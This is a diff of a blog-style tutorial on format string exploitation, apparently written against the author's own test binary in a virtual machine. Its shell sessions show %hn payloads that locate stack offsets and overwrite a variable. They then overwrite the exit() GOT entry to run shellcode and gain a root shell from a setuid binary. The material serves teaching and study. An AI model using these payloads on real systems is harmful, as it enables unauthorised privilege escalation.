@@ -213,8 +213,6 @@ The astute reader would have pointed out this would have been *much* simpler usi
 
 ## Writing to an arbitrary address
 
-### TODO: clean this up
-
 `printf` has a little known format parameter - `%n` - that writes the number of bytes written so far. The argument it takes is a memory address - something we know we can control.
 
 ~~~ c
@@ -253,106 +251,73 @@ vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\
 var = 0xaaaa0034 and is located at 0xffffdb1c
 ~~~
 
-To write to the upper half of the address we'll need another `%hn` and start the string with `<address><address+2>`:
+Instead of overwriting the target address with a 32 bit value, we'll overwrite the upper and lower halves separately. This means we'll use 2 `%hn` modifiers - the first will write to `<address>` and the second to `<address+2>` - for a total of 32 bits.
+
+`printf` can also take positional arguments - so `printf("$2s, $1s", "first arg", "second arg")` would print `second arg, first arg`. We will replace the `%08x` padding with this - it's equivalent (as in `printf` will jump down the stack) and saves space in the format string (in case our user input is limited). After some trial and error we have:
 
 ~~~ shell
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDDEEEE"+"%08x"*6 + "%p%p"')
-DDDDEEEEffffdd1af7ffcf1cf7fefe7a00000008f7fefe66f7ffd0000x444444440x45454545
-var = 0xaaaaaaaa and is located at 0xffffdb0c
-~~~
-
-Note the address of `var` has changed - that's because the length of our format string has changed too. This kind of procedure is very sensitive to length.
-
-~~~ shell
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x0c\xdb\xff\xff\x0e\xdb\xff\xff"+"%08x"*6 + "%hn%hn"')
-
-▒▒ffffdd18f7ffcf1cf7fefe7a00000008f7fefe66f7ffd000
-var = 0x00380038 and is located at 0xffffdb0c
-~~~
-
-Okay we're getting there. Now we need a better way to control the number of bytes written to each address:
-
-~~~ shell
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\xfc\xda\xff\xffDDDD\xfe\xda\xff\xff"+"%08x"*5 + "%00000x%hn%00000x%hn"')
-▒▒DDDD▒▒ffffdd0af7ffcf1cf7fefe7a00000008f7fefe66f7ffd00044444444
-var = 0x0044003c and is located at 0xffffdafc
-~~~
-
-Notice that since we added `%00000x` before the first `%hn` we take one off from the 6 `%08x`. We also add `DDDD` between the 2 addresses to account for the second `%00000x`. We're now ready to change the offset such that the written value becomes `0xffffdd5a`, the address of the environment variable containing our shellcode.
-
-~~~ shell
-(gdb) p 0xdd5a - 0x003d + 9
-$1 = 56614
-...
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\xfc\xda\xff\xffDDDD\xfe\xda\xff\xff"+"%08x"*5 + "%56614x%hn%0000x%hn"')
-...
-var = 0xdd62dd5a and is located at 0xffffdafc
-...
-(gdb) p 0xffff - 0xdd5a
-$2 = 8869
-...
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\xfc\xda\xff\xffDDDD\xfe\xda\xff\xff"+"%08x"*5 + "%56614x%hn%08869x%hn"')
-...
-var = 0xffffdd5a and is located at 0xffffdafc
-~~~
-
-I'm not entirely sure where the extra 9 comes into play but it's what it took to get `0xdd5a` to show up properly (TBA).
-
-We managed to overwrite the `var`'s address with that of our environment variable - but as it stands that doesn't help us at all. What we really want is to overwrite a function pointer.
-
-~~~ shell
-vagrant@vagrant:~/scratch$ objdump -h a.out | grep fini_arr
- 19 .fini_array   00000004  08049f0c  08049f0c  00000f0c  2**2
-~~~
-
-
-var = 0xdd5affff and is located at 0xffffdafc
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\xfc\xda\xff\xffDDDD\xfe\xda\xff\xff"+"%08x"*5 + "%65483x%hn%56667x%hn"')
-
-var = 0xffffdd5a and is located at 0xffffdafc
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\xfc\xda\xff\xffDDDD\xfe\xda\xff\xff"+"%08x"*5 + "%56614x%hn%08869x%hn"')
-
-
-
-
-
-
-
-### Success!!
-
 vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDDEEEE" + "%00000x%7$p%00000x%8$p"')
 DDDDEEEEffffdd200x44444444f7ffcf1c0x45454545
 var = 0xaaaaaaaa and is located at 0xffffdb1c
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDDEEEE" + "%00000x%7$p%00000x%8$p"')
-DDDDEEEEffffdd200x44444444f7ffcf1c0x45454545
-var = 0xaaaaaaaa and is located at 0xffffdb1c
+~~~
+
+So our addresses are located at the 7th and 8th position. We replace `p` with `hn` and as expected we get a seg fault - the addresses`0x44444444` and `0x45454545` are not ours.
+
+~~~ shell
 vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDDEEEE" + "%00000x%7$hn%00000x%8$hn"')
 Segmentation fault (core dumped)
+~~~
+
+We use `var`'s address instead:
+
+~~~ shell
 vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff" + "%00000x%7$hn%00000x%8$hn"')
 ▒▒ffffdd1ef7ffcf1c
 var = 0x00180010 and is located at 0xffffdb1c
+~~~
 
+Okay - getting there. We know that by the time we get to the first `hn` we would have already written 8 bytes - so we want to write an additional `0xdd5a - 8` for the first part and `0xffff - 0xdd5a` for the second:
+
+~~~ shell
+(gdb) p 0xdd5a - 8
+$42 = 56658
 (gdb) p 0xffff - 0xdd5a
-$42 = 8869
-(gdb) p 0xdd5a - 0x18
-$43 = 56642
-(gdb) p 0xdd5a - 0x10
-$44 = 56650
+$43 = 8869
+~~~
 
-var = 0xfff7dd52 and is located at 0xffffdb1c
-vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff" + "%56650x%7$hn%08869x%8$hn"')
+And we see that it does work:
 
-
-var = 0xffffdd5a and is located at 0xffffdb1c
+~~~ shell
 vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x1c\xdb\xff\xff\x1e\xdb\xff\xff" + "%56658x%7$hn%08869x%8$hn"')
+var = 0xffffdd5a and is located at 0xffffdb1c
+~~~
 
+Now instead of writing this to `var`'s address, we need something useful. There's no point printing our shellcode to screen. Simliar to a buffer overflow we want to override something exectuable - and it turns out there's just the thing. Our binary calls a number of functions defined in `libc`. In our case we call `exit` at the end. We can see where the address for that function gets loaded - and by overwriting that with the address of our shellcode, we can get this executed instead:
+
+~~~ shell
+vagrant@vagrant:~/scratch$ objdump -R a.out | grep exit
+0804a014 R_386_JUMP_SLOT   exit@GLIBC_2.0
+~~~
+
+Assuming our executable was owned by root and had the sticky bit set, we'd get an escalated shell:
+
+~~~ shell
 vagrant@vagrant:~/scratch$ sudo chown root a.out
 vagrant@vagrant:~/scratch$ sudo chmod u+s a.out
 vagrant@vagrant:~/scratch$ id
 uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
 vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x14\xa0\x04\x08\x16\xa0\x04\x08" + "%56658x%7$hn%08869x%8$hn"')
-
+...
 var = 0xaaaaaaaa and is located at 0xffffdb1c
 # id
 uid=0(root) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+~~~
 
+## Conclusion and references
+
+Don't forget that your shellcode is still on the stack - and it needs to be executable!
+
+  * [CS155](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf) at Standford
+  * [printf format string exploitation](https://systemoverlord.com/2014/02/12/printf-format-string-exploitation/) on System Overlord
+  * JBremer's post on [format string vulnerabilities](http://jbremer.org/format-string-vulnerabilities/#fmtstr-calc-offsets)
+  * Code Arcana's introduction to [format string explots](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
